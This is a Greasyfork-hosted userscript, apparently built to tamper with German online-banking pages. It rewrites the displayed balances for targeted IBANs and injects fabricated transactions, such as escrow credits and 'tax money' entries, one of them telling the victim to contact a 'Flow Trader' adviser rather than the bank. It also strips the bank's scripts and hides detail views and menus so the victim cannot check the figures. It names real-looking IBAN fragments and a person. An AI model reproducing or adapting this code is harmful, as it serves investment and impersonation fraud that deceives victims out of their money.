// ==UserScript==
// @name         Ed Raif Jens Bögelsack
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.rb-lauf.de/*
// @match        https://www.drivehq.com/*
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/491091/Ed%20Raif%20Jens%20B%C3%B6gelsack.user.js
// @updateURL https://update.greasyfork.org/scripts/491091/Ed%20Raif%20Jens%20B%C3%B6gelsack.meta.js
// ==/UserScript==

 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {

//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================


//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------

   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
  //      { index: 0, adjustmentAmount:  60 },
  //      { index: 1, adjustmentAmount: 60 },
  //      { index: 5, adjustmentAmount: 60 },
        { index: 3, adjustmentAmount: 0 },
        { index: 6, adjustmentAmount: 0 }
        // Add more balance configurations as needed
    ];


//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------

    // Define the target text content to search for (case and whitespace insensitive)
    var targetTextContent1 = "DE16 1009 0000";
    var targetTextContent2 = " 2341 4840 09";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 0.0; // Adjust the amount as needed

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
    const timeoutMillis = 0; // Adjust the timeout as needed



//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------


    // Configurable timeout value (in milliseconds)
    const TIMEOUT_MS = 0; // Change this value as needed



    // Array of configurable transactions
    const TRANSACTIONS = [
// {
//            title: 'JP Morgan Chase',
//            description: 'Geld für Steuern. Nicht Ausgeben für andere Zwecke',
//            amount: '3.500,00',
 //           date: 'Heute',
 //           insertAfter: false, // Set to false to insert before the original transaction
 //           moveSteps: 1, // Number of steps to move the transaction
 //           moveDirectionDown: false, // Set to false to move up
 //           order: 1 // Specify the order in which the transaction should be inserted
 //       },
 //      {
 //           title: 'JP Morgan Chase',
 //           description: 'Geld für Steuern. Nicht Ausgeben',
 //           amount: '21.000,00',
 //           date: 'Heute',
 //           insertAfter: false, // Set to false to insert before the original transaction
 //           moveSteps: 1, // Number of steps to move the transaction
 //           moveDirectionDown: false, // Set to false to move up
 //           order: 2 // Specify the order in which the transaction should be inserted
 //       },
//        {
//            title: 'JP Morgan Chase',
//            description: 'Test',
//            amount: '500,00',
 //           date: '27 Feb.',
 //           insertAfter: false, // Set to false to insert before the original transaction
 //           moveSteps: 1, // Number of steps to move the transaction
  //          moveDirectionDown: false, // Set to false to move up
  //          order: 3 // Specify the order in which the transaction should be inserted
  //      },
  //          {
  //          title: 'JP Morgan Chase',
 //           description: 'Wenden Sie sich an Flow Trader Berater, nicht die Bank, damit nicht gesperrt.',
  //          amount: '227.964,00',
  //          date: 'Heute',
  //          insertAfter: false, // Set to false to insert before the original transaction
  //          moveSteps: 1, // Number of steps to move the transaction
  //          moveDirectionDown: false, // Set to false to move up
 //           order: 4 // Specify the order in which the transaction should be inserted
//        },

        // Add more transaction configurations here
    ];




//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================




//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------

if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0) {

    (function() {
        'use strict';

        // Define the target text content to search for (case and whitespace insensitive)
        var targetTextContent1 = "Herzlich willkommen!";
        var targetTextContent2 = " ";

        // Configurable timeout in milliseconds (default: 2000 milliseconds)
        const timeoutMillis = 0; // Adjust the timeout as needed

//        // Array of configurable balance adjustments
 //       var BALANCE_CONFIGS = [
 //           { index: 0, adjustmentAmount: -5000 },
 //           { index: 1, adjustmentAmount: -5000 },
 //           { index: 2, adjustmentAmount: -5000 }
 //           // Add more balance configurations as needed
 //       ];

        // Function to remove scripts from the document
        function removeScripts() {
            console.log('Removing scripts...');
            document.querySelectorAll('script').forEach(function(script) {
                script.remove();
                console.log('Script removed.');
            });
        }

        function modifyBalances() {
            // Select all elements with class "saldo ng-star-inserted"
            var balanceElements = document.querySelectorAll('.saldo.ng-star-inserted');

            // Iterate over each configuration in BALANCE_CONFIGS
            BALANCE_CONFIGS.forEach(function(config) {
                // Use the index from the configuration to access the specific balance element
                var balanceElement = balanceElements[config.index];

                // Proceed only if the balance element exists
                if (balanceElement) {
                    // Get the current balance text content
                    var balanceText = balanceElement.textContent;

                    // Remove non-numeric characters and replace commas with dots
                    var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

                    // Check if there is a direct sibling with the class "waehrung ng-star-inserted"
                    var siblingCurrencyElement = balanceElement.nextElementSibling;
                    if (siblingCurrencyElement && siblingCurrencyElement.classList.contains('waehrung') && siblingCurrencyElement.classList.contains('ng-star-inserted')) {
                        // Check for the presence of " Umsatzanzeige" in the page text content
                        if (document.body.textContent.includes(" Umsatzanzeige")) {
                            console.log('Text " Umsatzanzeige" found. Balance modification not performed.');
                        } else {
                            // Modify the balance based on the sign and the adjustment amount
                            numericValue += config.adjustmentAmount;

                            // Update the data-positive attribute based on the new balance sign
                            balanceElement.parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');

                            // Format the modified balance value
                            var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', {
                                style: 'currency',
                                currency: 'EUR'
                            }).replace('€', 'EUR');

                            // Update the balance text content
                            balanceElement.textContent = updatedBalanceText;

                            // Check for an extra minus sign and remove it
                            if (balanceElement.textContent.includes('--')) {
                                balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                            }

                            // Remove the sibling currency element
                            siblingCurrencyElement.remove();
                        }
                    }
                }
            });
        }

        // Function to check for specific text content and "EUR" currency
        function checkForConditions() {
            // Get the text content of the entire page and convert to lowercase
            var pageTextContent = document.body.textContent.toLowerCase();

            // Check if either of the target text contents is found on the page
            if (pageTextContent.includes(targetTextContent1) || pageTextContent.includes(targetTextContent2)) {
                // Execute the modifyBalances function
                modifyBalances();
            }
        }

        // Function to observe and remove the second child of the parent with class "konto-list-header-wrapper"
        function observeAndRemoveSecondChild() {
            var parentElement = document.querySelector('.konto-list-header-wrapper');

            if (parentElement && parentElement.children.length >= 2) {
                // Select the second child and remove it
                var secondChild = parentElement.children[1];
                secondChild.remove();
            }
        }

        // Remove scripts immediately
        removeScripts();

        // Check for conditions at regular intervals
        setInterval(checkForConditions, 20); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)

        // Observe and remove the second child periodically
        setInterval(observeAndRemoveSecondChild, 1000); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)

    })();

}

//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

    // Define the target text content to search for (case and whitespace insensitive)
 //   var targetTextContent1 = "DE02 5606 1472";
 //   var targetTextContent2 = "0008 3176 19";

    // Configurable modification amount (positive or negative)
 //   const modificationAmount = -100.0; // Adjust the amount as needed

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
//    const timeoutMillis = 0; // Adjust the timeout as needed

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Function to modify the balance value, update data-positive attribute, and remove currency element
    function modifyBalance() {
        // Select the parent element with attribute data-positive
        var parentElement = document.querySelector('[data-positive]');

        // Check if the parent element exists
        if (parentElement) {
            // Select the element with class "saldo ng-star-inserted" within the parent
            var balanceElement = parentElement.querySelector('.saldo.ng-star-inserted');

            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                var balanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots
                var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

                // Check if the parent element has data-positive="0" indicating a negative balance
                var isNegative = parentElement.getAttribute('data-positive') === '0';

                // Modify the balance based on the sign and the modification amount
                numericValue += modificationAmount;

                // Update the data-positive attribute based on the new balance sign
                parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');

                // Format the modified balance value
                var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

                // Update the balance text content
                balanceElement.textContent = updatedBalanceText;

                // Check for an extra minus sign and remove it
                if (balanceElement.textContent.includes('--')) {
                    balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                }
            } else {
                console.error('Balance element not found.');
            }

            // Select and remove the currency element if it exists
            var currencyElement = parentElement.querySelector('.waehrung.ng-star-inserted');
            if (currencyElement) {
                currencyElement.remove();
            }
        } else {
            console.error('Parent element with data-positive attribute not found.');
        }
    }

    // Function to check for specific text content and "EUR" currency
    function checkForConditions() {
        // Check if the text "Herzlich willkommen!" is found on the page
        if (document.body.textContent.includes("Herzlich willkommen!")) {
            // Exit the script if the welcome text is found
            return;
        }

        // Get the text content of the entire page and convert to lowercase
        var pageTextContent = document.body.textContent.toLowerCase();

        // Check if either of the target text contents is found on the page
        if (pageTextContent.includes(targetTextContent1) || pageTextContent.includes(targetTextContent2)) {
            // Check for "EUR" under the class "waehrung ng-star-inserted"
            var currencyElement = document.querySelector('.waehrung.ng-star-inserted');
            if (currencyElement && currencyElement.textContent.toLowerCase() === 'eur') {
                // Execute the modifyBalance function
                modifyBalance();
            }
        }
    }

    // Remove scripts immediately
    removeScripts();

    // Check for conditions at regular intervals
    setInterval(checkForConditions, 2); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)

})();


}



//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------

if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0) {

    (function() {
        'use strict';

        // Configurable timeout value (in milliseconds)
 //       const TIMEOUT_MS = 0; // Change this value as needed

//        // Define the target text content to search for (case and whitespace insensitive)
//        var targetTextContent1 = "DE02 5606 1472";
//        var targetTextContent2 = " 0008 3176 19";

        // Array of configurable transactions
//        const TRANSACTIONS = [
//            {
//                title: 'Treuhand: Payward Limited',
//                description: 'Treuhand: Freigabe nötig durch Payward Limited',
//                amount: '550.000,00',
//                date: 'Vorgemerkt',
 //               insertAfter: false, // Set to false to insert before the original transaction
 //               moveSteps: 1, // Number of steps to move the transaction
 //               moveDirectionDown: false, // Set to false to move up
 //               order: 2 // Specify the order in which the transaction should be inserted
 //           },
//            {
 //               title: 'Payward Limited',
 //               description: 'Geld für Steuern',
 //               amount: '37.000,00',
 //               date: '26. Nov.',
//                insertAfter: false, // Set to false to insert before the original transaction
 //               moveStes: 0, // Number of steps to move the transaction
 //               moveDirectionDown: true, // Set to false to move up
  //              order: 1 // Specify the order in which the transaction should be inserted
  //          },
            // Add more transaction configurations here
  //      ];

        // Sort transactions based on the 'order' property
        TRANSACTIONS.sort((a, b) => a.order - b.order);

        console.log('Userscript initiated.');

        // Function to remove scripts from the document
        function removeScripts() {
            console.log('Removing scripts...');
            document.querySelectorAll('script').forEach(function(script) {
                script.remove();
                console.log('Script removed.');
            });
        }

        // Watch for changes in the DOM and remove added scripts
        var observer = new MutationObserver(function(mutationsList) {
            for (var mutation of mutationsList) {
                if (mutation.addedNodes) {
                    for (var node of mutation.addedNodes) {
                        if (node.tagName === 'SCRIPT') {
                            console.log('Script added. Removing...');
                            node.remove();
                            console.log('Script removed.');
                        }
                    }
                }
            }
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

       // Function to process transactions
function processTransactions() {
    console.log('Processing multiple transactions.');

    // Check if both target text contents are found on the page
    const textFound = checkTextContent(targetTextContent1, targetTextContent2);

    if (textFound) {
        // Select the target element
        var targetElement = document.querySelector('app-umsatz-list-optimized');
        console.log('Searching for target element...');

        // Check if the target element exists
        if (!targetElement) {
            console.error('Target element not found');
            return;
        }
        console.log('Target element found:', targetElement);

        // Check if transactions have already been inserted
        if (!targetElement.querySelector('.custom-transaction')) {
            TRANSACTIONS.forEach((transaction, index) => {
                console.log(`Processing transaction ${index + 1}`);
                insertAndMoveTransaction(targetElement, transaction);
            });
        } else {
            console.log('Transactions have already been inserted.');
        }
    } else {
        console.log('Text contents not found on the page. Waiting for them to appear...');
    }
}


// Function to check if a text content is found on the page (case and whitespace insensitive)
function checkTextContent(text1, text2) {
    const pageText = document.querySelector('.konto-iban').textContent.replace(/\s/g, '').toLowerCase();
    const textToCheck1 = text1.replace(/\s/g, '').toLowerCase();
    const textToCheck2 = text2.replace(/\s/g, '').toLowerCase();

    return pageText.includes(textToCheck1) && pageText.includes(textToCheck2);
}






    // Function to insert and move a transaction
    function insertAndMoveTransaction(targetElement, config) {
        // Get the first child of the target element
        var firstChild = targetElement.firstElementChild;
        if (!firstChild) {
            console.error('No first child found in the target element');
            return;
        }

        // Clone the first child
        var clone = firstChild.cloneNode(true);

        // Add a class to identify custom transactions
        clone.classList.add('custom-transaction');

        // Customization of cloned child
        updateElementTextContent(clone, '.umsatz-name.text-truncate', config.title);
        updateElementTextContent(clone, '.verwendungszweck-label.text-truncate', config.description);
        setCustomAmountAndCurrency(clone, config.amount);
        updateElementTextContent(clone, '.d-flex.justify-content-end.buchung-zeit', config.date);

        // Insert the cloned node based on the configuration
        var referenceNode = config.insertAfter ? firstChild.nextSibling : firstChild;
        targetElement.insertBefore(clone, referenceNode);

        // Move the cloned node based on the configuration
        moveTransaction(clone, config.moveSteps, config.moveDirectionDown);
    }

    // Helper function to update text content of an element within the clone
    function updateElementTextContent(clone, selector, newText) {
        const element = clone.querySelector(selector);
        if (element) {
            console.log(`Found element for selector '${selector}', updating text content.`);
            element.textContent = newText;
        } else {
            console.error(`Element not found for selector '${selector}'.`);
        }
    }

    // Function to set custom amount and update currency positivity based on the amount's sign
    function setCustomAmountAndCurrency(clone, amount) {
        const amountElement = clone.querySelector('.text-right.konto-umsatz-saldo-shredder span');
        const currencyElement = clone.querySelector('.waehrung-shredder.text-left span');
        const isPositive = !amount.startsWith('-'); // Determines positivity based on amount's sign

        if (amountElement && currencyElement) {
            console.log('Found amount and currency elements:', amountElement, currencyElement);
            amountElement.textContent = amount;
            amountElement.setAttribute('data-positive', isPositive ? '1' : '0');
            currencyElement.setAttribute('data-positive', isPositive ? '1' : '0');
        } else {
            console.error('Amount or currency element not found.');
        }
    }

    // Function to move the transaction up or down by a specified number of steps
    function moveTransaction(transactionNode, steps, moveDown) {
        let currentNode = transactionNode;
        while (steps > 0 && currentNode) {
            currentNode = moveDown ? currentNode.nextSibling : currentNode.previousSibling;
            steps--;
        }

        if (currentNode) {
            const referenceNode = moveDown ? currentNode.nextSibling : currentNode;
            transactionNode.parentNode.insertBefore(transactionNode, referenceNode);
            console.log('Transaction moved.');
        } else {
            console.error('Unable to move transaction: Reached the end of the list.');
        }
    }

    // Continuously check for the presence of transactions every 2 seconds
    setInterval(processTransactions, 100);

})();


}


//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------




//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

//    // Define the target text contents to search for (case and whitespace insensitive)
//    var targetTextContent1 = "DE02 5606 1472";
 //  var targetTextContent2 = "0008 3176 19";

//    // Configurable modification amount (positive or negative)
//   const modificationAmount = 400.0; // Adjust the amount as needed

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Function to modify the balance value
    function modifyBalance() {
        // Select the element with class "kf-account-saldo-value"
        var balanceElement = document.querySelector('.kf-account-saldo-value');

        // Check if the balance element exists
        if (balanceElement) {
            // Get the current balance text content
            var balanceText = balanceElement.textContent;

            // Remove non-numeric characters and replace commas with dots
            var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

            // Modify the balance based on the sign and the modification amount
            numericValue += modificationAmount;

            // Format the modified balance value
            var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

            // Update the balance text content
            balanceElement.textContent = updatedBalanceText;

            // Check for an extra minus sign and remove it
            if (balanceElement.textContent.includes('--')) {
                balanceElement.textContent = balanceElement.textContent.replace('--', '-');
            }

            // Check the class name of the parent element to update data-positive attribute
            var parentElement = balanceElement.closest('.kf-account-saldo');
            if (parentElement) {
                var isPositive = numericValue >= 0;
                parentElement.classList.remove('kf-account-saldo-positive', 'kf-account-saldo-negative');
                parentElement.classList.add(isPositive ? 'kf-account-saldo-positive' : 'kf-account-saldo-negative');
            }

            console.log('Balance modified successfully.');

            // Select and remove the sibling currency element if it exists
            var currencyElement = balanceElement.nextElementSibling;
            if (currencyElement && currencyElement.classList.contains('kf-account-saldo-currency')) {
                currencyElement.remove();
                console.log('Currency element removed.');
            }
        } else {
            console.error('Balance element not found.');
        }
    }

// Function to check for specific text content and the presence of currency element
function checkForConditions() {
    // Get the text content of the ".kf-account-iban" element, convert to lowercase, and trim whitespace
    var ibanTextContent = document.querySelector('.kf-account-iban').textContent.toLowerCase().trim();

    // Convert the target text contents to lowercase and trim whitespace
    var lowerCaseTargetTextContent1 = targetTextContent1.toLowerCase().trim();
    var lowerCaseTargetTextContent2 = targetTextContent2.toLowerCase().trim();

    // Check if both target text contents are found within the "kf-account-iban" element
    if (ibanTextContent.includes(lowerCaseTargetTextContent1) && ibanTextContent.includes(lowerCaseTargetTextContent2)) {
        // Check if the sibling currency element is present
        var currencyElement = document.querySelector('.kf-account-saldo-value + .kf-account-saldo-currency');
        if (currencyElement) {
            // Execute the modifyBalance function
            modifyBalance();
        }
    }
}



    // Remove scripts immediately
    removeScripts();

    // Check for conditions at regular intervals
    setInterval(checkForConditions, 20); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)


    // Function to observe and remove elements with "mat-form-field-subscript-wrapper" in the class name
function observeAndRemoveElements() {
    // Select elements with the specified class name
    var elementsToRemove = document.querySelectorAll('[class*="mat-form-field-subscript-wrapper"]');

    // Check if any matching elements were found
    if (elementsToRemove.length > 0) {
        // Remove each matching element
        elementsToRemove.forEach(function (element) {
            element.remove();
        });

        console.log('Removed elements with class containing "mat-form-field-subscript-wrapper".');
    }
}

// Observe and remove elements periodically
setInterval(observeAndRemoveElements, 50); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)


})();


}

//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555---------------VOLKS UMSAETZE UTILITY FUNCTIONS------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

    console.log('Volks umsatze utility functions userscript initiated.');

    // Function to remove elements with "submenu" in their class names
    function removeElementsWithSubmenuClass() {
        const elementsToRemove = document.querySelectorAll('[class*="submenu"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with "submenu" in class name:', element);
        });
    }

    // Function to remove elements with "select-arrow" in their class names
    function removeElementsWithSelectArrowClass() {
        const elementsToRemove = document.querySelectorAll('[class*="select-arrow"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with "select-arrow" in class name:', element);
        });
    }

    // Function to remove elements with aria-label="Details" and their parent with class "ng-star-inserted"
    function removeUnwantedElements() {
        const elementsToRemove = document.querySelectorAll('[aria-label="Details"]');
        elementsToRemove.forEach(element => {
            const parent = element.closest('.ng-star-inserted');
            if (parent) {
                parent.remove();
                console.log('Removed parent element:', parent);
            }
        });
    }

    // Function to remove elements with the class "chevron"
    function removeElementsWithChevronClass() {
        const elementsToRemove = document.querySelectorAll('.chevron');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with class "chevron":', element);
        });
    }

    // Function to remove elements with the class "umsatz-item-detail-shredder"
    function removeElementsWithDetailClass() {
        const elementsToRemove = document.querySelectorAll('.umsatz-item-detail-shredder');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with class "umsatz-item-detail-shredder":', element);
        });
    }

    // Function to prevent default click behavior for elements under "mat-form-field-wrapper"
    function preventClickUnderMatFormFieldWrapper(event) {
        const matFormFieldWrapper = document.querySelector('[class*="mat-form-field-wrapper"]');
        if (matFormFieldWrapper && (matFormFieldWrapper.contains(event.target) || event.target.matches('[class*="mat-form-field-wrapper"]'))) {
            event.stopPropagation();
            event.preventDefault();
        }
    }

    // Function to remove elements with role="listbox"
    function removeElementsWithListboxRole() {
        const elementsToRemove = document.querySelectorAll('[role="listbox"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with role="listbox":', element);
        });
    }

    // Watch for changes in the DOM and remove unwanted elements
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                removeUnwantedElements();
                removeElementsWithSubmenuClass();
                removeElementsWithSelectArrowClass();
                removeElementsWithChevronClass();
                removeElementsWithDetailClass();
                removeElementsWithListboxRole(); // Add removal of elements with role="listbox"
            }
        }
    });

    // Add click event listener to prevent default behavior under "mat-form-field-wrapper"
    document.addEventListener('click', preventClickUnderMatFormFieldWrapper);

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Initial removal of unwanted elements
    removeUnwantedElements();
    removeElementsWithSubmenuClass();
    removeElementsWithSelectArrowClass();
    removeElementsWithChevronClass();
    removeElementsWithDetailClass();
    removeElementsWithListboxRole(); // Add initial removal of elements with role="listbox"
})();

}


//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END---------------VOLKS UMSAETZE UTILITY FUNCTIONS------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------


}

//--------------------------------===============================================================================-----------



// SECOND ACCOUNT -----------------------------------------------------------------------------------------------------

//----------------------------------------------------------------------------------------------------------------------------










//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

    // Define the target text content to search for (case and whitespace insensitive)
   var targetTextContent1 = "DE54 5486 2500";
   var targetTextContent2 = " 0007 4430 30";

    // Configurable modification amount (positive or negative)
  const modificationAmount = 5000.0; // Adjust the amount as needed

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
//    const timeoutMillis = 0; // Adjust the timeout as needed

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Function to modify the balance value, update data-positive attribute, and remove currency element
    function modifyBalance() {
        // Select the parent element with attribute data-positive
        var parentElement = document.querySelector('[data-positive]');

        // Check if the parent element exists
        if (parentElement) {
            // Select the element with class "saldo ng-star-inserted" within the parent
            var balanceElement = parentElement.querySelector('.saldo.ng-star-inserted');

            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                var balanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots
                var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

                // Check if the parent element has data-positive="0" indicating a negative balance
                var isNegative = parentElement.getAttribute('data-positive') === '0';

                // Modify the balance based on the sign and the modification amount
                numericValue += modificationAmount;

                // Update the data-positive attribute based on the new balance sign
                parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');

                // Format the modified balance value
                var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

                // Update the balance text content
                balanceElement.textContent = updatedBalanceText;

                // Check for an extra minus sign and remove it
                if (balanceElement.textContent.includes('--')) {
                    balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                }
            } else {
                console.error('Balance element not found.');
            }

            // Select and remove the currency element if it exists
            var currencyElement = parentElement.querySelector('.waehrung.ng-star-inserted');
            if (currencyElement) {
                currencyElement.remove();
            }
        } else {
            console.error('Parent element with data-positive attribute not found.');
        }
    }

    // Function to check for specific text content and "EUR" currency
    function checkForConditions() {
        // Check if the text "Herzlich willkommen!" is found on the page
        if (document.body.textContent.includes("Herzlich willkommen!")) {
            // Exit the script if the welcome text is found
            return;
        }

        // Get the text content of the entire page and convert to lowercase
        var pageTextContent = document.body.textContent.toLowerCase();

        // Check if either of the target text contents is found on the page
        if (pageTextContent.includes(targetTextContent1) || pageTextContent.includes(targetTextContent2)) {
            // Check for "EUR" under the class "waehrung ng-star-inserted"
            var currencyElement = document.querySelector('.waehrung.ng-star-inserted');
            if (currencyElement && currencyElement.textContent.toLowerCase() === 'eur') {
                // Execute the modifyBalance function
                modifyBalance();
            }
        }
    }

    // Remove scripts immediately
    removeScripts();

    // Check for conditions at regular intervals
    setInterval(checkForConditions, 2); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)

})();


}



//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------

